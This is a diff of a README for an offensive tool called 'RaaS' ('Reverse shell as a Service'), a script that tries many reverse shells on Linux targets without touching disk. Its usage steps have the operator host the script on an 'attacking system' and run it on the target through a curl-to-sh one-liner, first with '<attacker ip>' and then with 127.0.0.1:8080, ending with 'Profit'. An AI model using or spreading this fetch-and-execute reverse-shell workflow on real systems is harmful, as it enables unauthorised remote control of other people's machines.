@@ -1,13 +1,15 @@
 # RaaS
-Reverse shell as a Service script that tries all the different reverse shells on Linux systems without touching the disk.
+Reverse shell as a Service script that executes all the different reverse shells on Linux systems without touching disk on the target system.
 
 # Usage
-1. Host the file on your system
+1. Change IP and PORT variables accordingly
+
+2. Host the file on your attacking system
 
    $ python3 -m http.server 8080
 
-3. Grab the file using Curl and pipe it to bash
+3. Grab the file using curl and execute it directly
 
-   $ curl http://<attacker ip>/8080|sh
+   $ curl http://127.0.0.1:8080 | sh
 
-5. Profit $$$
+4. $$$ Profit $$$
